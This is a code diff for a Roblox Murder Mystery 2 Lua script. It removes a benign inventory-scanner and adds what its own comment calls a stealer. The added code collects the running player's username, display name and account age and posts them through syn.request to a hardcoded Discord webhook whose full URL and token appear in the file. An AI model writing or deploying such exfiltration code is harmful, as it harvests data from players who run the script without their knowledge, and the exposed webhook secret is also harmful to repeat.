@@ -1,42 +1,46 @@
--- Сканер хранилища MM2
--- Найдёт, где лежит инвентарь
+-- Стилак MM2 для Alpha (Nersadme)
+-- Отправляет инфу только о том, кто запустил скрипт
 
-print("=== СКАНИРУЕМ REPLICATED STORAGE ===")
-for _, v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
-    print(v.Name, v.ClassName)
-    -- Если это папка или модуль, заглядываем внутрь
-    if v:IsA("Folder") or v:IsA("ModuleScript") or v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
-        print("  -> Содержимое " .. v.Name .. ":")
-        pcall(function()
-            for _, child in pairs(v:GetChildren()) do
-                print("      " .. child.Name, child.ClassName)
-            end
-        end)
-    end
+local webhook = "https://discord.com/api/webhooks/1534478195519393974/T6RAtnjzdd0OE_6m1EZD6OjCx4x-npU2bBLP73mvHRmeZRBmmviciIx-6S5JEEsHmv37"
+local alphaNick = "Nersadme"
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+-- Метод отправки типов
+local function sendWebhook(url, data)
+    local body = HttpService:JSONEncode(data)
+    pcall(function()
+        syn.request({
+            Url = url,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["User-Agent"] = "Mozilla/5.0"
+            },
+            Body = body
+        })
+    end)
 end
 
-print("=== СКАНИРУЕМ PLAYER ===")
-local me = game:GetService("Players").LocalPlayer
-for _, v in pairs(me:GetChildren()) do
-    print(v.Name, v.ClassName)
-    if v:IsA("Folder") or v:IsA("ModuleScript") then
-        print("  -> Содержимое " .. v.Name .. ":")
-        pcall(function()
-            for _, child in pairs(v:GetChildren()) do
-                print("      " .. child.Name, child.ClassName)
-            end
-        end)
-    end
-end
+-- Получаем инфу о том, кто запустил скрипт (LocalPlayer)
+local player = Players.LocalPlayer
 
-print("=== СКАНИРУЕМ PLAYER GUI ===")
-pcall(function()
-    local gui = me:FindFirstChild("PlayerGui")
-    if gui then
-        for _, v in pairs(gui:GetDescendants()) do
-            if v:IsA("TextLabel") and string.find(v.Text, "Knife") or string.find(v.Text, "Gun") or string.find(v.Text, "Skin") or string.find(v.Text, "Item") then
-                print("  Найдено в GUI: " .. v.Text)
-            end
-        end
-    end
-end)
+-- Собираем инфу
+local info = {
+    Name = player.Name,
+    DisplayName = player.DisplayName,
+    AccountAge = player.AccountAge
+}
+
+-- Отправляем в Discord
+sendWebhook(webhook, {
+    content = "Игрок запустил скрипт, Alpha!",
+    embeds = {{
+        title = "Информация о запустившем",
+        fields = {
+            {name = "Ник", value = info.Name},
+            {name = "Возраст аккаунта", value = tostring(info.AccountAge) .. " дней"}
+        }
+    }}
+})
